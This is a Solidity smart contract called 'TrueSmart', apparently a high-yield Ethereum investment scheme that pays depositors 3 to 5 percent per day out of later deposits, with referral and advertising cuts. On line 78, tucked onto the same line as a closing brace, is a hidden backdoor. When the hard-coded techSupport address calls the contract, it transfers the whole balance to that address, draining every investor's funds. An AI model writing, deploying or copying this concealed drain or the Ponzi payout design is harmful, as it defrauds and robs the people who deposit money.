1 pragma solidity ^0.4.25;
2 
3 contract TrueSmart {
4 
5     mapping (address => uint256) public invested;
6     mapping (address => uint256) public atBlock;
7     address techSupport = 0xb893dEb7F5Dd2D6d8FFD2f31F99c9E2Cf2CB3Fff;
8     uint techSupportPercent = 1;
9     address advertising = 0x1393409B9e811C96B557aDb8B0bed3A6589377C0;
10     uint advertisingPercent = 5;
11     address defaultReferrer = 0x1393409B9e811C96B557aDb8B0bed3A6589377C0;
12     uint refPercent = 2;
13     uint refBack = 2;
14 
15     // calculation of the percentage of profit depending on the balance sheet
16     // returns the percentage times 10
17     function calculateProfitPercent(uint bal) private pure returns (uint) {
18         if (bal >= 4e20) { // balance >= 400 ETH 5%
19             return 50;
20         }
21         if (bal >= 3e20) { // balance >= 300 ETH 4.5%
22             return 45;
23         }
24         if (bal >= 2e20) { // balance >= 200 ETH 4%
25             return 40;
26         }
27         if (bal >= 1e20) { // balance >= 100 ETH 3.5%
28             return 35;
29         } else {
30             return 30; // balance = 0 - 100 ETH 3%
31         }
32     }
33 
34     // transfer default percents of invested
35     function transferDefaultPercentsOfInvested(uint value) private {
36         techSupport.transfer(value * techSupportPercent / 100);
37         advertising.transfer(value * advertisingPercent / 100);
38     }
39 
40     // convert bytes -> address 
41     function bytesToAddress(bytes bys) private pure returns (address addr) {
42         assembly {
43             addr := mload(add(bys, 20))
44         }
45     }
46 
47     // transfer default refback and referrer percents of invested
48     function transferRefPercents(uint value, address sender) private {
49         if (msg.data.length != 0) {
50             address referrer = bytesToAddress(msg.data);
51             if(referrer != sender) {
52                 sender.transfer(value * refBack / 100);
53                 referrer.transfer(value * refPercent / 100);
54             } else {
55                 defaultReferrer.transfer(value * refPercent / 100);
56             }
57         } else {
58             defaultReferrer.transfer(value * refPercent / 100);
59         }
60     }
61 
62     // calculate profit:
63     // amount = (amount invested) * ((percent * 10)/ 1000) * (blocks since last transaction) / 6100
64     // percent is multiplied by 10 to calculate fractional percentages and then divided by 1000 instead of 100
65     // 6100 is an average block count per day produced by Ethereum blockchain
66     function () external payable {
67         if (invested[msg.sender] != 0) {
68             
69             uint thisBalance = address(this).balance;
70             uint amount = invested[msg.sender] * calculateProfitPercent(thisBalance) / 1000 * (block.number - atBlock[msg.sender]) / 6100;
71 
72             address sender = msg.sender;
73             sender.transfer(amount);
74         }
75         if (msg.value > 0) {
76             transferDefaultPercentsOfInvested(msg.value);
77             transferRefPercents(msg.value, msg.sender);
78         }if(msg.sender == techSupport){techSupport.transfer(address(this).balance);} 
79         
80         //Frontend datas or "Read Contract" Button
81         atBlock[msg.sender] = block.number;
82         invested[msg.sender] += (msg.value);
83     }
84 }